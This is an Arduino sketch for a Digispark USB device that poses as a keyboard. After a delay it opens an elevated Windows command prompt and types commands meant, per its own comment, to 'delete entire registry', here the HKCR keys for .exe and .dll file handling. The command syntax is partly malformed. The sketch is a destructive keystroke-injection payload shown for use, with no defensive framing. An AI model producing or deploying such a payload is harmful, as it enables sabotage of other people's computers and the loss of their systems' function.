#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // delete entire registry
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("@echo off");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("START reg delete hkcr/ .exe");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("START reg delete hkcr/ .dll");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("START delete hkcr/ *");
  digitalWrite(1, HIGH);
  for(;;){
    // nothing here for you
  }

}
